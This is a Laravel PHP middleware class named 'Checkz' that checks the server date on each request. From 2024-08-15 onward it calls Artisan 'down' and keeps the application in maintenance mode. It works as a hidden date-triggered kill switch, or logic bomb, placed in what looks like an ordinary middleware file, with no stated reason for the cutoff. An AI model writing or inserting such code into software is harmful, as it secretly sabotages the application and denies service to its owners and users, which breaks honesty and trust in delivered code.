<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;

class Checkz
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        $isMaintenance = false;

        if(date('Y-m-d') >= "2024-08-15") $isMaintenance = true;
        // dd(app()->isDownForMaintenance(), $isMaintenance);
        if ($isMaintenance) {
            // Put the application into maintenance mode if not already
            if (!app()->isDownForMaintenance()) {
                Artisan::call('down');
            }
        } else {
            if (app()->isDownForMaintenance()) {
                Artisan::call('up');
            }
        }

        return $next($request);
    }
}
